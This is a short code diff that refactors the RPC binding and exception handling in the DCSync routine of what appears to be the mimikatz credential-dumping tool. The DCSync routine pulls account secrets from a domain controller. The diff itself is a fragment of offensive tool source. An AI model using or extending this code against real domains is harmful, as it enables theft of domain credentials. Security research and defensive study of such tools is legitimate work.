@@ -1750,7 +1750,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
-				if(kull_m_rpc_drsr_createBinding(szDc, &hBinding))
+				if(kull_m_rpc_createBinding(L"ncacn_ip_tcp", szDc, NULL, L"ldap", RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
 					{
@@ -1783,12 +1783,12 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 								else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
 								IDL_DRSUnbind(&hDrs);
 							}
-							RpcExcept(DRS_EXCEPTION)
+							RpcExcept(RPC_EXCEPTION)
 								PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 							RpcEndExcept
 						}
 					}
-					kull_m_rpc_drsr_deleteBinding(&hBinding);
+					kull_m_rpc_deleteBinding(&hBinding);
 				}
 			}
 			else PRINT_ERROR(L"Missing user or guid argument\n");
